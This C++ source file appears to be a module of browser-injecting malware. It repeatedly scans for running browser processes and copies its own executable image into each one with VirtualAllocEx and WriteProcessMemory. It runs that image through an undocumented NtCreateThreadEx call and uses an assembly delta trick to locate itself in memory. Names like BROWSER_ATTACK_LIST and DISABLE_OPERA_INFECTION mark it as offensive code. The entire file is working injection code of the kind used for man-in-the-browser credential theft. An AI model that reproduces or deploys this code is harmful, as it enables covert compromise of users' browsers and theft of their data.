#include <windows.h>

#include "inject.h"

#include "api.h"
#include "common/mem.h"
#include "common/str.h"

#include "debug/error.h"
#include "debug/debug.h"

#undef UNICODE
//static inject::PBROWSER_ATTACK_INFO		attack_info[AVAILABLE_BROWSERS + 1];

VOID inject::inject_to_browsers(VOID)
{
	ERROR_CODE				status;

	BROWSER_ATTACK_LIST		*attack_list;
	LPVOID					local_virtual_base;
	UINT					i, c;

	init(&attack_list);

	local_virtual_base = get_module_virtual_base();

	while (TRUE) {

		// Get all PIDs
		for (i = 0; i < AVAILABLE_BROWSERS; i++) {
			cSleep(100);
			mem::zeromem(attack_list->attack_list[i]->pids, sizeof(DWORD) * INJECT_MAX_PIDS);
			status = find_pids(attack_list->attack_list[i]->name, attack_list->attack_list[i]->pids);
			ERROR_IF_NULL(status, error::ER_GENERAL_FAILURE, error::default_halt_code);
		}

		// Inject into all PIDs
		for (i = 0; i < AVAILABLE_BROWSERS; i++) {
			c = 0;
			while (attack_list->attack_list[i]->pids[c] != 0) {
				cSleep(100);

				status = inject_dll(attack_list->attack_list[i]->pids[c], local_virtual_base);
				if (status == error::ER_OK) {
#ifdef DEBUG_OUT
					DBGOUT("Injected into %d", attack_list->attack_list[i]->pids[c]);
#endif

				} else {
#ifdef DEBUG_OUT
					//DBGOUT("Failed to inject into %d", attack_list->attack_list[i]->pids[c]);
#endif
				}
				c++;
			}
		}
	}
}

VOID inject::init(inject::PBROWSER_ATTACK_LIST *attack_list)
{

	*attack_list = (PBROWSER_ATTACK_LIST)mem::malloc(sizeof(BROWSER_ATTACK_LIST));

	for (UINT i = 0; i < AVAILABLE_BROWSERS; i++) {
		(*attack_list)->attack_list[i]			= (PBROWSER_ATTACK_INFO)mem::malloc(sizeof(BROWSER_ATTACK_INFO));
		(*attack_list)->attack_list[i]->name	= (LPSTR)mem::malloc(str::lenA(inject::browser_list[i]) + 1);
		str::strcpyA((*attack_list)->attack_list[i]->name, inject::browser_list[i], str::lenA(inject::browser_list[i]));
	}

	return;
}

ERROR_CODE inject::find_pids(	__in	LPCSTR	process_name,
										__out	DWORD	pid_array[INJECT_MAX_PIDS])
{
	PROCESSENTRY32		process_info;
	HANDLE				process_snapshot;
	DWORD				pid_parent_array[INJECT_MAX_PIDS];
	DWORD				explorer_pid;
	UINT				pid_count							= 0;

	mem::zeromem(pid_parent_array, sizeof(pid_parent_array));

	mem::zeromem((void *)&process_info, sizeof(PROCESSENTRY32));
	process_info.dwSize = sizeof(PROCESSENTRY32);

#ifdef DISABLE_OPERA_INFECTION
	if (!str::compareA(process_name, "opera.exe", str::lenA("opera.exe"))) {
		//DBGOUT("Passing opera process");
		return TRUE;
	}
#endif

	// If process_name is NULL, we return every PID on the system
	if (process_name == NULL) {
		process_snapshot = cCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		if ( process_snapshot == INVALID_HANDLE_VALUE ) {
			return FALSE;
		}

		if (cProcess32First(process_snapshot, &process_info) == FALSE) {
			return FALSE;
		}

		while (cProcess32Next(process_snapshot, &process_info)) {
			pid_array[pid_count] = process_info.th32ProcessID;
			if (pid_array[pid_count] == 0) {
				continue;
			}

			ZeroMemory((void *)&process_info, sizeof(PROCESSENTRY32));
			process_info.dwSize = sizeof(PROCESSENTRY32);

			pid_count++;
		}
		return TRUE;
	}

	process_snapshot = cCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if ( process_snapshot == INVALID_HANDLE_VALUE ) {
		return FALSE;
	}

	if (cProcess32First(process_snapshot, &process_info) == FALSE) {
		return FALSE;
	}

	//ZeroMemory(process_char, sizeof(process_char));
	//WideCharToMultiByte(CP_ACP, 0, process_info.szExeFile, -1, (LPSTR)process_char, sizeof(process_char), NULL, NULL);

	//WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, szTo, (int)wstr.length(), NULL, NULL);
	//wcstombs(process_char, (wchar_t *)process_info.szExeFile, sizeof(process_char));
	
	if (str::compareA(process_name, process_info.szExeFile, str::lenA(process_name) - 1) == 0) {
		pid_array[0] = process_info.th32ProcessID; 
		pid_parent_array[0] = process_info.th32ParentProcessID;
	}

	while (TRUE) {
		if (cProcess32Next(process_snapshot, &process_info) == FALSE) break;

		//ZeroMemory(process_char, sizeof(process_char));
	//	WideCharToMultiByte(CP_ACP, 0, process_info.szExeFile, -1, (LPSTR)process_char, sizeof(process_char), NULL, NULL);

		if (!str::compareA(process_info.szExeFile, "explorer.exe", str::lenA("explorer.exe"))) {
			explorer_pid					= process_info.th32ProcessID;
		}

		if (str::compareA((LPCSTR)process_name, process_info.szExeFile, str::lenA(process_name) - 1) == 0) {
			pid_array[pid_count]			= process_info.th32ProcessID;
			pid_parent_array[pid_count]		= process_info.th32ParentProcessID;
			pid_count++;
			continue;
		}
	}

	if (!str::compareA(process_name, "chrome.exe", str::lenA("chrome.exe"))) {
		filter_parents_pids(pid_array, pid_parent_array, explorer_pid);
	}

	cCloseHandle(process_snapshot);
	return TRUE;

}

// This is only for chrome, we want to list only the parent process
static VOID inject::filter_parents_pids(DWORD pid_array[INJECT_MAX_PIDS], DWORD pid_parent_array[INJECT_MAX_PIDS], DWORD explorer_pid)
{
	UINT				i;
	DWORD				tmp;

	i = 0;
	while (pid_parent_array[i] != explorer_pid) {
		i++;
		if (pid_parent_array[i] == 0) {
			break;
		}
	}

	tmp = pid_array[i];
	mem::zeromem(pid_array, INJECT_MAX_PIDS);

	pid_array[0] = tmp;

	return;
}

static ERROR_CODE inject::check_pe(LPCVOID virtual_image)
{
	PIMAGE_DOS_HEADER		dos_header;
	PIMAGE_NT_HEADERS		nt_headers;

	dos_header	= (PIMAGE_DOS_HEADER)virtual_image;
	if (dos_header->e_magic != 'ZM') {
		return error::ER_HEADER_ERROR;
	}

	nt_headers	= (PIMAGE_NT_HEADERS)((DWORD_PTR)virtual_image + dos_header->e_lfanew);
	if (nt_headers->Signature != 'EP') {
		return error::ER_HEADER_ERROR;
	}

	return error::ER_OK;
}

static UINT inject::get_virtual_size(LPCVOID virtual_image)
{
	ERROR_CODE			status;

	PIMAGE_DOS_HEADER		dos_header;
	PIMAGE_NT_HEADERS		nt_headers;

	status = check_pe(virtual_image);
	ERROR_IF_NOT_OK(status, error::default_halt_code);

	dos_header = (PIMAGE_DOS_HEADER)virtual_image;
	nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)virtual_image + dos_header->e_lfanew);

	return nt_headers->OptionalHeader.SizeOfImage;
}

static DWORD inject::get_virtual_base(LPCVOID virtual_image)
{
	ERROR_CODE				status;

	PIMAGE_DOS_HEADER		dos_header;
	PIMAGE_NT_HEADERS		nt_headers;

	status = (ERROR_CODE)check_pe(virtual_image);
	ERROR_IF_NOT_OK(status, error::default_halt_code);

	dos_header = (PIMAGE_DOS_HEADER)virtual_image;
	nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)virtual_image + dos_header->e_lfanew);

	return nt_headers->OptionalHeader.ImageBase;
}

LPVOID inject::get_module_virtual_base(VOID)
{
	DWORD		delta_value;
	LPVOID		ptr;

	__asm{	
		nop
		call	delta
delta:
		pop		eax
		mov		delta_value, eax
	}

	ptr = (LPVOID)(delta_value & 0xfffff000);
	while (*(PWORD)ptr != 'ZM') {
		ptr = (LPVOID)((DWORD_PTR)ptr - 0x1000);
	}

	return ptr;
}

static LPTHREAD_START_ROUTINE inject::get_virtual_oep(LPCVOID virtual_image)
{
	ERROR_CODE				status;

	PIMAGE_DOS_HEADER		dos_header;
	PIMAGE_NT_HEADERS		nt_headers;

	status = (ERROR_CODE)check_pe(virtual_image);
	ERROR_IF_NOT_OK(status, error::default_halt_code);

	dos_header = (PIMAGE_DOS_HEADER)virtual_image;
	nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)virtual_image + dos_header->e_lfanew);

	return (LPTHREAD_START_ROUTINE)(nt_headers->OptionalHeader.AddressOfEntryPoint + get_virtual_base(virtual_image));

}

ERROR_CODE inject::inject_dll(DWORD pid, LPVOID virtual_image)
{
	ERROR_CODE			status;

	HANDLE				process;
	DWORD				remote_base;
	UINT				remote_virtual_size;
	INT					bytes_written;

	LPTHREAD_START_ROUTINE oep;

	process = cOpenProcess(			PROCESS_CREATE_THREAD | 
									PROCESS_QUERY_INFORMATION | 
									PROCESS_SUSPEND_RESUME | 
									PROCESS_VM_WRITE |
									PROCESS_VM_OPERATION,
									FALSE, pid);
	if (process == INVALID_HANDLE_VALUE) {
		return error::ER_INJECT_FAILURE;
	}

	remote_virtual_size = get_virtual_size(virtual_image);
	if (remote_virtual_size == 0) {
		cCloseHandle(process);
		return error::ER_INJECT_FAILURE;
	}
	remote_base = get_virtual_base(virtual_image);
	if (remote_base == 0) {
		cCloseHandle(process);
		return error::ER_INJECT_FAILURE;
	}

	remote_base = (DWORD)cVirtualAllocEx(process, (LPVOID)get_virtual_base(virtual_image), get_virtual_size(virtual_image),
		MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (remote_base != get_virtual_base(virtual_image)) {
		cCloseHandle(process);
		return error::ER_INJECT_FAILURE;
	}

	status = (ERROR_CODE)cWriteProcessMemory(process, (LPVOID)remote_base, get_module_virtual_base(), 
		remote_virtual_size, (PUINT)&bytes_written);
	if (!status || (bytes_written != remote_virtual_size)) {
		cCloseHandle(process);
		return error::ER_INJECT_FAILURE;
	}

	oep				= get_virtual_oep(virtual_image);
	if (oep == 0) {
		cCloseHandle(process);
		return error::ER_INJECT_FAILURE;
	}


	status			= (ERROR_CODE)create_dll_thread(process, oep);
	if (!status) {
		cCloseHandle(process);
		return error::ER_INJECT_FAILURE;
	}
	/*
	remote_thread = cCreateRemoteThread(process,
										NULL,
										0,
										oep,
										NULL,
										0,
										NULL);
	if (remote_thread == INVALID_HANDLE_VALUE) {
		return error::ER_INJECT_FAILURE;
	}*/

	cCloseHandle(process);
	return error::ER_OK;
}

static NTSTATUS inject::create_dll_thread(HANDLE process, LPTHREAD_START_ROUTINE oep)
{
	NTSTATUS						ntstatus;
	LNtCreateThreadEx				f_CreateThreadEx;
	NTCREATETHREADEXBUFFER			ntcreatethreadbuffer;
	HMODULE							ntdll;
	HANDLE							remote_thread;
	PVOID							buffer1, buffer2;

	f_CreateThreadEx				= NULL;
	ntdll							= cLoadLibraryA("ntdll.dll");
	if (ntdll == 0) {
		return FALSE;
	}
	f_CreateThreadEx				= (LNtCreateThreadEx)cGetProcAddress(ntdll, "NtCreateThreadEx");
	if (f_CreateThreadEx == NULL) {
		return FALSE;
	}

	mem::zeromem(&ntcreatethreadbuffer, sizeof(NTCREATETHREADEXBUFFER));
	buffer1							= (PVOID)mem::malloc(512);
	buffer2							= (PVOID)mem::malloc(512);

	ntcreatethreadbuffer.Size		= sizeof(NTCREATETHREADEXBUFFER);
	ntcreatethreadbuffer.Unknown1	= 0x10003;
	ntcreatethreadbuffer.Unknown2	= 0x8;		//
	ntcreatethreadbuffer.Unknown3	= (PDWORD)buffer1;
	ntcreatethreadbuffer.Unknown4	= 0;
	ntcreatethreadbuffer.Unknown5	= 0x10004;
	ntcreatethreadbuffer.Unknown6	= 4;
	ntcreatethreadbuffer.Unknown7	= (PDWORD)buffer2;
	ntcreatethreadbuffer.Unknown8	= 0;

	ntstatus = f_CreateThreadEx(	&remote_thread,
									0x1FFFFF,
									NULL,
									process,
									(LPTHREAD_START_ROUTINE)oep,
									NULL,
									FALSE,
									NULL,
									NULL,
									NULL,
									(LPVOID)&ntcreatethreadbuffer);							

	mem::free(buffer1);
	mem::free(buffer2);
	return ntstatus;
}
